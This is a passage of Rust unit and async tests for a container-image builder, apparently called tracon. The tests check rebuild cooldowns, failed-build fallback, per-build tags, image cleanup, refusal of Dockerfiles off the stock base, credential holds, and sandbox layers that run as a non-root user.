            assert!(in_flight(&store, repo, &building.recipe_hash).is_some());
            ensure(&builder, &store, repo, true).await
        });
        let Ensured::Rebuilt(image) = first else {
            panic!("the first request builds: {first:?}");
        };
        assert_eq!(forced, Ensured::Current(image));
        let built = builder.builds.lock().unwrap().len();
        assert_eq!(built, 2, "one image and its source, built once");

        // Asked for once nothing is running, it builds again.
        assert!(in_flight(&store, repo, &base_row(&store, repo).recipe_hash).is_none());
        let again = ensure(&builder, &store, repo, true).await;
        assert!(matches!(again, Ensured::Rebuilt(_)), "{again:?}");
    }

    fn base_row(store: &Store, repo: &Path) -> crate::store::RepoImageRow {
        store
            .ready_repo_image(&repo.to_string_lossy(), BASE)
            .unwrap()
            .unwrap()
    }

    fn commit_conf(repo: &Path, value: &str) {
        sh(
            repo,
            &format!(
                "echo {value} > .devcontainer/tool.conf && git commit -qam {value} \
                 && git update-ref refs/remotes/origin/main HEAD"
            ),
        );
    }

    /// A builder that cannot build at all, said before anything is staged or
    /// found during the build, is not a verdict on the recipe: nothing is
    /// recorded against it, and after a short cooldown (in which the queue
    /// behind it does not each try again) the next ask builds without being
    /// told to.
    #[tokio::test]
    async fn a_builder_that_cannot_build_is_not_held_against_the_recipe() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let path = repo.to_string_lossy();
        let hash = recipe(repo, &entry(repo), &pod()).await.unwrap().hash;

        *builder.down.lock().unwrap() = Some("buildkitd did not answer, so no".into());
        let ensured = ensure(&builder, &store, repo, false).await;
        let Ensured::Unavailable { reason } = &ensured else {
            panic!("{ensured:?}");
        };
        assert!(
            reason.starts_with("buildkitd did not answer, so no; tried again in 1")
                && reason.ends_with("or at once by `tracon repo build`"),
            "{reason}"
        );
        assert!(builder.builds.lock().unwrap().is_empty());
        assert_eq!(store.latest_repo_image(&path, BASE).unwrap(), None);

        // Cooling down: the builder is not asked again, even once it is back.
        *builder.down.lock().unwrap() = None;
        let ensured = ensure(&builder, &store, repo, false).await;
        assert!(
            matches!(&ensured, Ensured::Unavailable { reason } if reason.contains("tried again in")),
            "{ensured:?}"
        );
        assert!(builder.builds.lock().unwrap().is_empty());

        // A build the builder breaks mid-way is not recorded either.
        warm(repo, &hash);
        *builder.broken.lock().unwrap() = true;
        let ensured = ensure(&builder, &store, repo, false).await;
        assert!(
            matches!(&ensured, Ensured::Unavailable { reason }
                if reason.starts_with("buildkitd did not answer; tried again in")),
            "{ensured:?}"
        );
        assert_eq!(store.latest_repo_image(&path, BASE).unwrap(), None);

        // The operator asking goes past the cooldown; once it builds, the
        // cooldown is gone.
        *builder.broken.lock().unwrap() = false;
        assert!(matches!(
            ensure(&builder, &store, repo, true).await,
            Ensured::Rebuilt(_)
        ));
        assert_eq!(cooling(repo, &hash), None);
    }

    /// A layer that fails to build takes the source image built for it away,
    /// unless a build that stands already stands on that very image, as a
    /// cached rebuild of the same recipe can produce.
    #[tokio::test]
    async fn a_failed_layer_leaves_a_source_image_a_standing_build_uses() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder {
            same_digest: true,
            ..Default::default()
        };
        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
        let source = base_row(&store, repo).parent_image;
        *builder.fail_from.lock().unwrap() = Some(3);
        let ensured = ensure(&builder, &store, repo, true).await;
        assert!(matches!(ensured, Ensured::Stale { .. }), "{ensured:?}");
        assert!(!builder.removed.lock().unwrap().contains(&source));

        // With nothing standing on it, it goes.
        let other = checkout();
        let fresh = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        *builder.fail_from.lock().unwrap() = Some(1);
        ensure(&builder, &fresh, other.path(), false).await;
        let removed = builder.removed.lock().unwrap().clone();
        assert_eq!(removed.len(), 1);
        assert!(removed[0].contains("-src@sha256:"), "{removed:?}");
    }

    /// A builder that cannot say whether the image is still there keeps it in
    /// use and builds nothing on that account, even for a recipe that moved.
    #[tokio::test]
    async fn an_image_that_cannot_be_asked_about_is_kept_and_not_rebuilt() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let Ensured::Rebuilt(first) = ensure(&builder, &store, repo, false).await else {
            panic!("the first ensure builds");
        };
        commit_conf(repo, "moved");
        *builder.unknown.lock().unwrap() = true;
        let ensured = ensure(&builder, &store, repo, false).await;
        assert!(
            matches!(&ensured, Ensured::Stale { using, .. } if *using == first),
            "{ensured:?}"
        );
        assert_eq!(builder.builds.lock().unwrap().len(), 2);
        assert!(builder.removed.lock().unwrap().is_empty());

        *builder.unknown.lock().unwrap() = false;
        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
    }

    /// A forced rebuild of the same recipe builds a new source image under a
    /// tag of its own; the old one is removed by the digest recorded with
    /// it, and the new one stays.
    #[tokio::test]
    async fn a_superseded_source_image_is_removed_by_its_recorded_digest() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let Ensured::Rebuilt(first) = ensure(&builder, &store, repo, false).await else {
            panic!("the first ensure builds");
        };
        let first_source = base_row(&store, repo).parent_image;
        assert!(
            first_source.contains("-src@sha256:"),
            "the source is recorded by digest: {first_source}"
        );
        let Ensured::Rebuilt(second) = ensure(&builder, &store, repo, true).await else {
            panic!("a forced ensure builds");
        };
        assert_ne!(first, second);
        let second_source = base_row(&store, repo).parent_image;
        assert_ne!(first_source, second_source);
        let removed = builder.removed.lock().unwrap().clone();
        assert!(
            removed.contains(&first) && removed.contains(&first_source),
            "{removed:?}"
        );
        assert!(
            !removed
                .iter()
                .any(|image| image == &second_source || image.contains("-src:")),
            "{removed:?}"
        );
    }

    #[test]
    fn each_build_has_a_tag_of_its_own() {
        let name = image_name(Path::new("/src/app"));
        let key = "0123456789abcdef".repeat(4);
        let (a, b) = (uuid::Uuid::now_v7(), uuid::Uuid::now_v7());
        let one = build_tag(&name, &key, &a.to_string());
        let two = build_tag(&name, &key, &b.to_string());
        assert_ne!(one, two);
        assert_eq!(one, format!("{name}:0123456789ab-{}", a.simple()));
        for built in [&one, &two] {
            // Under the repository's one name, which a digest reference
            // resolves through and the sweep classifies by.
            assert_eq!(crate::image_gc::repository_of(built), name);
            let tag = built.rsplit_once(':').unwrap().1;
            assert!(
                tag.len() <= 128 && tag.chars().all(|c| c.is_ascii_alphanumeric() || c == '-'),
                "{tag}"
            );
        }
    }

    /// Another process on the same image store and checkout path (a second
    /// node, a test) building the same repository tags its build with a tag
    /// of its own, so the image this node recorded still resolves and is
    /// still the one it built.
    #[tokio::test]
    async fn another_build_of_the_repository_leaves_a_recorded_image_resolving() {
        let tmp = checkout();
        let repo = tmp.path();
        let builder = FakeBuilder {
            tagged: true,
            ..Default::default()
        };
        let ours = Store::open_in_memory().unwrap();
        let Ensured::Rebuilt(first) = ensure(&builder, &ours, repo, false).await else {
            panic!("the first ensure builds");
        };
        let row = base_row(&ours, repo);

        let theirs = Store::open_in_memory().unwrap();
        let Ensured::Rebuilt(second) = ensure(&builder, &theirs, repo, true).await else {
            panic!("the other process builds its own");
        };
        assert_ne!(first, second);
        assert!(builder.resolves(&first), "{first}");
        assert!(builder.resolves(&row.parent_image), "{}", row.parent_image);
        assert_eq!(
            ensure(&builder, &ours, repo, false).await,
            Ensured::Current(first.clone()),
            "neither moved nor rebuilt"
        );

        let tags: Vec<String> = builder
            .builds
            .lock()
            .unwrap()
            .iter()
            .map(|(tag, _, _)| tag.clone())
            .collect();
        assert_eq!(tags.len(), 4, "a source and a layer each: {tags:?}");
        let distinct: std::collections::HashSet<_> = tags.iter().collect();
        assert_eq!(distinct.len(), 4, "{tags:?}");
        assert!(tags.contains(&build_tag(&image_name(repo), &row.recipe_hash, &row.id)));
        assert!(tags.contains(&source_tag(repo, &row.recipe_hash, &row.id)));
    }

    /// A builder that keeps a previous generation removes a build only once a
    /// second one has replaced it, so a pod still about to pull the one
    /// before finds it.
    #[tokio::test]
    async fn a_registry_keeps_the_previous_generation() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder {
            retains: true,
            ..Default::default()
        };
        let Ensured::Rebuilt(first) = ensure(&builder, &store, repo, false).await else {
            panic!("the first ensure builds");
        };
        let first_source = base_row(&store, repo).parent_image;
        commit_conf(repo, "second");
        let Ensured::Rebuilt(second) = ensure(&builder, &store, repo, false).await else {
            panic!("a moved recipe rebuilds");
        };
        assert!(builder.removed.lock().unwrap().is_empty());
        commit_conf(repo, "third");
        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
        let removed = builder.removed.lock().unwrap().clone();
        assert_eq!(removed, vec![first, first_source]);
        assert!(!removed.contains(&second));
    }

    /// A Dockerfile that stops building does not take the repository's image
    /// away, and is not rebuilt on every ask.
    /// A trial builds exactly what the entry's own build would, records it
    /// beside the repository's image rather than as it, and an entry with the
    /// same recipe then adopts it instead of building it again.
    #[tokio::test]
    async fn an_entry_adopts_the_image_a_trial_built_from_its_recipe() {
        let tmp = checkout();
        let repo = tmp.path();
        let repo_path = repo.to_string_lossy();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let cfg = Config::pod_hosted();

        let first = recipe(repo, &entry(repo), &pod()).await.unwrap();
        assert_eq!(
            already_built(&builder, &store, repo, &first.hash).await,
            None
        );
        let tried = build_for_trial(&builder, &cfg, &store, repo, &first)
            .await
            .unwrap();
        assert_eq!(builder.builds.lock().unwrap().len(), 2);
        assert_eq!(
            already_built(&builder, &store, repo, &first.hash).await,
            Some(tried.image.clone())
        );
        // Tried, not taken: nothing runs the repository's work in it yet.
        assert!(store.ready_repo_image(&repo_path, BASE).unwrap().is_none());
        // Asked again, it is not built twice.
        build_for_trial(&builder, &cfg, &store, repo, &first)
            .await
            .unwrap();
        assert_eq!(builder.builds.lock().unwrap().len(), 2);

        assert_eq!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(tried.image.clone())
        );
        assert_eq!(
            builder.builds.lock().unwrap().len(),
            2,
            "adopted, not rebuilt"
        );
        let base = store.ready_repo_image(&repo_path, BASE).unwrap().unwrap();
        assert_eq!(base.image, tried.image);
        assert_eq!(base.recipe_hash, first.hash);

        // A later trial of another recipe keeps only its own trial image, and
        // never removes the one the entry adopted.
        let mut images = Vec::new();
        for conf in ["b", "c"] {
            sh(
                repo,
                &format!(
                    "echo {conf} > .devcontainer/tool.conf && git commit -qam {conf} \
                     && git update-ref refs/remotes/origin/main HEAD"
                ),
            );
            let next = recipe(repo, &entry(repo), &pod()).await.unwrap();
            assert_ne!(next.hash, first.hash);
            images.push(
                build_for_trial(&builder, &cfg, &store, repo, &next)
                    .await
                    .unwrap()
                    .image,
            );
        }
        let removed = builder.removed.lock().unwrap();
        assert!(!removed.contains(&tried.image), "{removed:?}");
        assert!(removed.contains(&images[0]), "{removed:?}");
        assert!(!removed.contains(&images[1]), "{removed:?}");
    }

    #[tokio::test]
    async fn a_failed_build_keeps_the_last_image_and_is_not_retried_unasked() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let Ensured::Rebuilt(good) = ensure(&builder, &store, repo, false).await else {
            panic!("the first ensure builds");
        };

        sh(
            repo,
            "echo 'RUN false' >> .devcontainer/Dockerfile && git commit -qam broken \
             && git update-ref refs/remotes/origin/main HEAD",
        );
        *builder.fail.lock().unwrap() = true;
        let Ensured::Stale { using, error } = ensure(&builder, &store, repo, false).await else {
            panic!("a failed build falls back");
        };
        assert_eq!(using, good);
        assert!(error.contains("exited 1"), "{error}");
        let failed = store
            .latest_repo_image(&repo.to_string_lossy(), BASE)
            .unwrap()
            .unwrap();
        assert_eq!(failed.status, "failed");
        assert_eq!(failed.log_tail, "Error: no such package");

        // Asked again, it answers from the record; asked to build, it builds.
        *builder.fail.lock().unwrap() = false;
        let Ensured::Stale { error, .. } = ensure(&builder, &store, repo, false).await else {
            panic!("the failure stands until someone asks for a build");
        };
        assert!(error.contains("tracon repo build"), "{error}");
        assert!(matches!(
            ensure(&builder, &store, repo, true).await,
            Ensured::Rebuilt(_)
        ));
    }

    /// With no image that ever built, a failure leaves nothing to run in; and
    /// an image the runtime no longer holds is built again rather than named.
    #[tokio::test]
    async fn an_image_that_is_gone_is_built_again() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();

        let missing = Repo {
            dockerfile: Some("docker/Dockerfile".into()),
            ..entry(repo)
        };
        let unavailable = ensure_with(
            &builder,
            &LocalRunner,
            &Config::pod_hosted(),
            &store,
            repo,
            &missing,
            &[],
            false,
            None,
        )
        .await;
        let Ensured::Unavailable { reason } = unavailable else {
            panic!("a Dockerfile the default branch does not hold cannot build");
        };
        assert!(
            reason.contains("docker/Dockerfile is not in origin/main"),
            "{reason}"
        );

        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
        *builder.pruned.lock().unwrap() = true;
        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
    }

    #[tokio::test]
    async fn a_command_the_image_has_no_tool_for_is_named_when_it_is_built() {
        let commands = [
            "sh -c true".to_string(),
            "tracon-no-such-tool --check".to_string(),
            "FOO=1 make".to_string(),
            "./scripts/check.sh".to_string(),
        ];
        assert_eq!(
            missing_tools(&LocalRunner, "ignored", &commands).await,
            ["tracon-no-such-tool --check"]
        );
    }

    /// Answers the harness probe with whatever the test says the image does.
    struct ProbeRunner {
        says: &'static str,
        exit: i32,
        ran_in: StdMutex<Vec<String>>,
    }

    impl ProbeRunner {
        fn saying(says: &'static str, exit: i32) -> Self {
            Self {
                says,
                exit,
                ran_in: StdMutex::new(Vec::new()),
            }
        }
    }

    #[async_trait]
    impl Runner for ProbeRunner {
        async fn spawn(
            &self,
            _cmd: RunnerCommand,
        ) -> Result<crate::runner::Spawned, crate::runner::RunnerError> {
            Err(crate::runner::RunnerError::Other("not used here".into()))
        }
        async fn run_capture(
            &self,
            cmd: RunnerCommand,
        ) -> Result<std::process::Output, crate::runner::RunnerError> {
            use std::os::unix::process::ExitStatusExt;
            self.ran_in
                .lock()
                .unwrap()
                .push(cmd.image.unwrap_or_default());
            Ok(std::process::Output {
                status: std::process::ExitStatus::from_raw(self.exit << 8),
                stdout: self.says.as_bytes().to_vec(),
                stderr: Vec::new(),
            })
        }
        async fn kill(&self, _name: &str) -> Result<(), crate::runner::RunnerError> {
            Ok(())
        }
    }

    const BASE_IMAGE: &str =
        "localhost/tracon-repo-app@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

    /// What `session_started` says a session runs in, on each kind of node.
    #[test]
    fn a_session_reports_the_image_it_runs_in_and_where_that_came_from() {
        let image = |image: &str, toolchain: &str| SessionImage {
            image: Some(image.into()),
            toolchain_image: Some(toolchain.into()),
            note: None,
        };
        let mut sandboxed: Config =
            toml::from_str("[runtime.podman]\nsandbox_protocol = true\nsandbox_images = true\n")
                .unwrap();
        let mut apple = Config::pod_hosted();
        apple.runtime.kind = crate::config::RuntimeKind::Apple;
        sandboxed.sandbox.base_image = Some("ghcr.io/x/tracon-sandbox-base:1".into());
        let mut bundled = vec![apple, Config::pod_hosted()];
        if cfg!(target_os = "linux") {
            bundled.push(sandboxed);
        }
        let snapshot = "localhost/tracon-snapshot-app-1@sha256:d6cc";
        for cfg in &bundled {
            let base = crate::sandbox_images::base_image(cfg);
            let none = SessionImage::default();
            assert_eq!(none.source(cfg), STOCK_BASE);
            assert_eq!(none.reported(cfg), base);
            assert_eq!(image(&base, &base).source(cfg), STOCK_BASE);
            assert_eq!(
                image(BASE_IMAGE, BASE_IMAGE).source(cfg),
                "repository image"
            );
            let prepared = image(snapshot, BASE_IMAGE);
            assert_eq!(prepared.source(cfg), "prepared snapshot");
            assert_eq!(prepared.reported(cfg), snapshot);
            assert_eq!(image(snapshot, &base).source(cfg), "prepared snapshot");
        }
    }

    fn pod() -> RunAs {
        RunAs::sandbox()
    }

    /// A runtime that builds with `builder`.
    struct Pulling {
        builder: FakeBuilder,
    }
    #[async_trait]
    impl Backend for Pulling {
        fn kind(&self) -> &'static str {
            "pulling"
        }
        async fn setup(
            &self,
            _cfg: &Config,
            _rebuild: bool,
        ) -> Result<(), crate::boundary::BoundaryError> {
            Ok(())
        }
        async fn check_all(&self, _cfg: &Config, _deep: bool) -> crate::boundary::BoundaryReport {
            crate::boundary::BoundaryReport { checks: Vec::new() }
        }
        fn runner(&self, _extra: Vec<crate::runner::Mount>) -> Arc<dyn Runner> {
            Arc::new(ProbeRunner::saying("1 (Claude Code)", 0))
        }
        fn runner_for(&self, _id: &str, _extra: Vec<crate::runner::Mount>) -> Arc<dyn Runner> {
            Arc::new(ProbeRunner::saying("1 (Claude Code)", 0))
        }
        fn image_builder(&self) -> Option<&dyn ImageBuilder> {
            Some(&self.builder)
        }
        async fn import_volume(
            &self,
            _volume: &str,
            _source: &Path,
        ) -> Result<(), crate::boundary::BoundaryError> {
            *self.builder.warms.lock().unwrap() += 1;
            if let Some(warming) = self.builder.warming {
                tokio::time::sleep(warming).await;
            }
            Ok(())
        }
        async fn export_volume(
            &self,
            _volume: &str,
            _destination: &Path,
        ) -> Result<(), crate::boundary::BoundaryError> {
            Ok(())
        }
        fn harness_host(&self) -> String {
            "localhost".into()
        }
        fn harness_home(&self) -> String {
            "/home/harness".into()
        }
        async fn reconcile(&self, _names: &[String]) {}
    }

    #[test]
    fn image_names_are_readable_and_distinct() {
        let a = image_name(Path::new("/src/My App"));
        let b = image_name(Path::new("/other/My App"));
        assert!(a.starts_with("localhost/tracon-repo-my-app-"), "{a}");
        assert_ne!(a, b);
        assert!(a
            .trim_start_matches("localhost/")
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-'));
    }

    /// Every repository runs on the stock base: an `image`, or a Dockerfile
    /// that does not begin on the base, is refused with what to do instead.
    #[test]
    fn a_repository_off_the_stock_base_is_refused() {
        let image = Repo {
            path: "github.com/o/mesa".into(),
            image: Some("ghcr.io/astral-sh/uv@sha256:35b0".into()),
            ..Default::default()
        };
        let dockerfile = Repo {
            path: "github.com/o/tracon".into(),
            dockerfile: Some(".devcontainer/Containerfile".into()),
            ..Default::default()
        };
        let fedora = "# syntax=docker/dockerfile:1\nARG V=41\nFROM --platform=$BUILDPLATFORM \\\n  fedora:$V AS dev\nUSER dev\n";
        let on_base = [
            "FROM ${TRACON_SANDBOX_BASE}\nRUN apt-get install -y jq\n",
            "# comment\nfrom $TRACON_SANDBOX_BASE as tools\nFROM rust AS other\n",
        ];

        assert!(off_the_stock_base(&dockerfile, Some(fedora)).is_some());
        for text in on_base {
            assert_eq!(off_the_stock_base(&dockerfile, Some(text)), None);
        }
        // A Dockerfile that cannot be read is the build's to report.
        assert_eq!(off_the_stock_base(&dockerfile, None), None);
        let stock = Repo {
            path: "github.com/o/plain".into(),
            prepare: vec!["uv sync".into()],
            ..Default::default()
        };
        assert_eq!(off_the_stock_base(&stock, None), None);

        let said = off_the_stock_base(&image, None).unwrap();
        for part in [
            "github.com/o/mesa",
            "`image = ",
            "stock base",
            "`build`",
            "`prepare`",
        ] {
            assert!(said.contains(part), "{part}: {said}");
        }
        let said = off_the_stock_base(&dockerfile, Some(fedora)).unwrap();
        for part in [
            "`dockerfile = \".devcontainer/Containerfile\"`",
            "FROM fedora:$V",
            "FROM ${TRACON_SANDBOX_BASE}",
            "`build`",
        ] {
            assert!(said.contains(part), "{part}: {said}");
        }
    }

    /// What a session, a check or a preparation is told: the refusal, read
    /// from the Dockerfile on the default branch, before anything is built.
    #[tokio::test]
    async fn a_refused_repository_builds_and_starts_nothing() {
        let tmp = checkout();
        sh(
            tmp.path(),
            "printf 'FROM scratch\\nCOPY tool.conf /etc/\\n' > .devcontainer/Dockerfile \
             && git commit -qam scratch && git update-ref refs/remotes/origin/main HEAD",
        );
        let mut cfg = Config::pod_hosted();
        cfg.runtime.kind = crate::config::RuntimeKind::Apple;
        cfg.repo = vec![entry(tmp.path())];
        let cfg = Arc::new(cfg);
        let store = Arc::new(Store::open_in_memory().unwrap());
        let pulling = Arc::new(Pulling {
            builder: FakeBuilder::default(),
        });
        let backend: Arc<dyn Backend> = pulling.clone();
        let refused = refusal(tmp.path(), &cfg.repos()[0]).await.unwrap();
        assert!(refused.contains("FROM scratch"), "{refused}");
        assert!(matches!(
            ensure_base(backend.as_ref(), &cfg, &store, tmp.path(), true).await,
            Ensured::Unavailable { reason } if reason == refused
        ));
        let session = session_image(&backend, &cfg, &store, tmp.path(), &|| {
            panic!("nothing is built")
        })
        .await;
        assert_eq!(session, Err(refused.clone()));
        let checks = environment(backend.as_ref(), &cfg, &store, Some(tmp.path())).await;
        assert_eq!(checks.err(), Some(refused));
        assert!(pulling.builder.builds.lock().unwrap().is_empty());
    }

    /// An attempt that builds nothing a row shows leaves its reason where
    /// `repo ls`, Settings and a waiting `tracon repo build` read it; a failed
    /// build's row speaks for itself, and an image that builds clears it.
    #[tokio::test]
    async fn an_attempt_that_built_nothing_says_why() {
        let tmp = checkout();
        let repo = tmp.path();
        let mut cfg = Config::pod_hosted();
        cfg.repo = vec![entry(repo)];
        let store = Store::open_in_memory().unwrap();
        let pulling = Pulling {
            builder: FakeBuilder::default(),
        };
        let note = || {
            unbuilt()
                .into_iter()
                .find(|note| note.repo_path == repo.to_string_lossy())
        };

        let refused = "the token service answered 403 Forbidden, so no";
        *pulling.builder.down.lock().unwrap() = Some(refused.into());
        let before = crate::store::now_ms();
        let ensured = ensure_base(&pulling, &cfg, &store, repo, true).await;
        assert!(
            matches!(&ensured, Ensured::Unavailable { .. }),
            "{ensured:?}"
        );
        let said = note().expect("an unavailable builder is noted");
        assert!(said.reason.starts_with(refused), "{said:?}");
        assert!(said.at_ms >= before && said.using.is_none(), "{said:?}");
        assert!(store
            .latest_repo_image(&repo.to_string_lossy(), BASE)
            .unwrap()
            .is_none());
        assert!(!ensuring().contains(&repo.to_string_lossy().into_owned()));

        // A failure the builder had mid-build is dropped, not recorded: noted.
        *pulling.builder.down.lock().unwrap() = None;
        *pulling.builder.broken.lock().unwrap() = true;
        ensure_base(&pulling, &cfg, &store, repo, true).await;
        assert!(note()
            .unwrap()
            .reason
            .starts_with("buildkitd did not answer"));

        // A recipe that fails is recorded, and the row says it.
        *pulling.builder.broken.lock().unwrap() = false;
        *pulling.builder.fail.lock().unwrap() = true;
        ensure_base(&pulling, &cfg, &store, repo, true).await;
        assert_eq!(note(), None);
        assert_eq!(
            store
                .latest_repo_image(&repo.to_string_lossy(), BASE)
                .unwrap()
                .unwrap()
                .status,
            "failed"
        );

        // Built, nothing is left to say; down again with an image standing,
        // the image runs keep using is named.
        *pulling.builder.fail.lock().unwrap() = false;
        let Ensured::Rebuilt(image) = ensure_base(&pulling, &cfg, &store, repo, true).await else {
            panic!("it builds");
        };
        assert_eq!(note(), None);
        *pulling.builder.down.lock().unwrap() = Some(refused.into());
        ensure_base(&pulling, &cfg, &store, repo, true).await;
        assert_eq!(note().unwrap().using, Some(image));
    }

    /// A sandbox is never root: the node's layer gives the base's user the
    /// workspace, the cache and its home, and ends as that user. Its keys are
    /// its own.
    #[tokio::test]
    async fn the_layer_runs_as_the_sandbox_user() {
        let source = "localhost/tracon-repo-app-src@sha256:abc";
        assert_eq!(
            normalised(source, &pod()),
            r#"FROM localhost/tracon-repo-app-src@sha256:abc
USER 0:0
RUN mkdir -p /work /cache /home/harness && chown 65532:65532 /work /cache && chown -R 65532:65532 /home/harness && if ! grep -q '^[^:]*:[^:]*:65532:' /etc/passwd 2>/dev/null; then echo 'harness:x:65532:65532::/home/harness:/bin/sh' >> /etc/passwd; fi && if ! grep -q '^[^:]*:[^:]*:65532:' /etc/group 2>/dev/null; then echo 'harness:x:65532:' >> /etc/group; fi && if [ -d /etc/profile.d ]; then printf 'export PATH="%s"\n' "$PATH" > /etc/profile.d/zz-tracon-path.sh; fi
ENV HOME=/home/harness
WORKDIR /work
USER 65532:65532
ENTRYPOINT []
"#
        );

        // The uid and the home are the profile's.
        let agent = RunAs {
            uid: 1000,
            home: "/home/agent".into(),
        };
        let other = normalised(source, &agent);
        assert!(other.contains("chown 1000:1000 /work /cache && chown -R 1000:1000 /home/agent"));
        assert!(other.contains("'harness:x:1000:1000::/home/agent:/bin/sh'"));
        assert!(other.contains("ENV HOME=/home/agent\n") && other.contains("USER 1000:1000\n"));

        let tmp = checkout();
        let repo = tmp.path();
        let sandbox = recipe(repo, &entry(repo), &pod()).await.unwrap();
        let elsewhere = recipe(repo, &entry(repo), &agent).await.unwrap();
        assert_ne!(sandbox.hash, elsewhere.hash);
        assert_eq!(
            (sandbox.context_tree, sandbox.source_commit),
            (elsewhere.context_tree, elsewhere.source_commit)
        );
    }

    /// An entry that keeps lending credentials to a preparation a peer's
    /// recipe changed is built and warmed by nothing (a forced build, a
    /// check's or a preparation's environment, a session, a default-branch
    /// change) until its hold is released; what last built stays in use.
    #[tokio::test]
    async fn a_held_entry_builds_and_warms_nothing_until_it_is_started() {
        use crate::store::recipe_offers::CredentialHoldRow;
        let tmp = checkout();
        let repo = tmp.path();
        let store = Arc::new(Store::open_in_memory().unwrap());
        let pulling = Arc::new(Pulling {
            builder: FakeBuilder::default(),
        });
        let backend: Arc<dyn Backend> = pulling.clone();
        let held_entry = Repo {
            prepare: vec!["npm ci".into()],
            egress: vec!["npm".into()],
            prepare_credentials: vec!["nova".into()],
            ..entry(repo)
        };
        let cfg = Arc::new(Config {
            repo: vec![held_entry.clone()],
            ..Config::pod_hosted()
        });
        let hold = CredentialHoldRow {
            path: repo.to_string_lossy().into(),
            offer_id: "o".into(),
            sender_node: "n".into(),
            repo: "github.com/acme/app".into(),
            credentials: vec!["nova".into()],
            lending_hash: crate::mesh::recipe::lending_hash(&held_entry),
            created_ms: 1,
        };
        store.credential_hold_put(&hold).unwrap();
        let builds = || pulling.builder.builds.lock().unwrap().len();

        let forced = ensure_base(backend.as_ref(), &cfg, &store, repo, true).await;
        assert!(
            matches!(&forced, Ensured::Unavailable { reason } if reason.starts_with("held: nova")),
            "{forced:?}"
        );
        let checks = environment(backend.as_ref(), &cfg, &store, Some(repo))
            .await
            .unwrap();
        assert!(
            checks.image_source.contains("held"),
            "{}",
            checks.image_source
        );
        let session = session_image(&backend, &cfg, &store, repo, &|| {})
            .await
            .unwrap();
        assert!(session.image.is_none());
        assert!(session.note.unwrap().contains("held"));
        assert_eq!(builds(), 0);

        // Started: it builds.
        assert!(store.credential_hold_release(&hold.path).unwrap());
        let built = ensure_base(backend.as_ref(), &cfg, &store, repo, false).await;
        let Ensured::Rebuilt(image) = built else {
            panic!("a released entry builds: {built:?}");
        };
        let after_start = builds();
        assert!(after_start > 0);

        // Held again, a default-branch change rebuilds nothing, forced or
        // not, and the image that stands is the one used.
        store.credential_hold_put(&hold).unwrap();
        commit_conf(repo, "changed");
        for force in [false, true] {
            let held = ensure_base(backend.as_ref(), &cfg, &store, repo, force).await;
            assert_eq!(
                held,
                Ensured::Stale {
                    using: image.clone(),
                    error: crate::mesh::recipe::held_reason(&hold),
                }
            );
        }
        assert_eq!(builds(), after_start);
    }

    fn stepped(repo: &Path) -> Repo {
        Repo {
            path: repo.to_path_buf(),
            build: vec![
                "apt-get update".into(),
                "apt-get install -y --no-install-recommends jq".into(),
            ],
            egress: vec!["apt".into()],
            ..Default::default()
        }
    }

    #[test]
    fn build_steps_run_as_root_in_roots_home_one_each_and_end_as_the_bases_user() {
        let file = steps_containerfile(
            "ghcr.io/cosmicspork/tracon-sandbox-base@sha256:ab",
            &["apt-get update".into(), "echo \"a b\" \\\nexit 3".into()],
        );
        assert_eq!(
            file,
            r#"FROM ghcr.io/cosmicspork/tracon-sandbox-base@sha256:ab
USER 0:0
ENV HOME=/root
RUN ["/bin/sh","-ec","apt-get update"]
RUN ["/bin/sh","-ec","echo \"a b\" \\\nexit 3"]
USER 65532:65532
ENV HOME=/home/harness
WORKDIR /work
"#
        );
    }

    #[tokio::test]
    async fn a_steps_recipe_is_keyed_on_the_base_the_steps_and_their_egress_alone() {
        let dir = tempfile::tempdir().unwrap();
        let repo = dir.path();
        let base = "localhost/base@sha256:aa";
        let recipe = steps_recipe(repo, &stepped(repo), base).await.unwrap();
        assert_eq!(recipe.steps, stepped(repo).build);
        assert_eq!(recipe.steps_base, base);
        assert!(recipe.dockerfile.is_empty() && recipe.context.is_empty());
        assert!(
            recipe
                .steps_egress
                .iter()
                .any(|host| host == "snapshot.ubuntu.com"),
            "{:?}",
            recipe.steps_egress
        );
        assert!(recipe.source_commit.is_empty(), "no commit, still a recipe");

        // A commit is recorded with the build and is no part of its key.
        sh(
            repo,
            "git init -q -b main . && git config user.email t@e && git config user.name t \
             && git config commit.gpgsign false && git commit -q --allow-empty -m one",
        );
        let committed = steps_recipe(repo, &stepped(repo), base).await.unwrap();
        assert_eq!(committed.hash, recipe.hash);
        assert_eq!(committed.source_ref, "HEAD");
        assert!(!committed.source_commit.is_empty());

        let mut steps = stepped(repo);
        steps.build.push("true".into());
        let mut egress = stepped(repo);
        egress.egress.push("pypi".into());
        for (entry, base) in [
            (stepped(repo), "localhost/base@sha256:bb"),
            (steps, base),
            (egress, base),
        ] {
            let changed = steps_recipe(repo, &entry, base).await.unwrap();
            assert_ne!(changed.hash, recipe.hash, "{entry:?} on {base}");
        }
    }

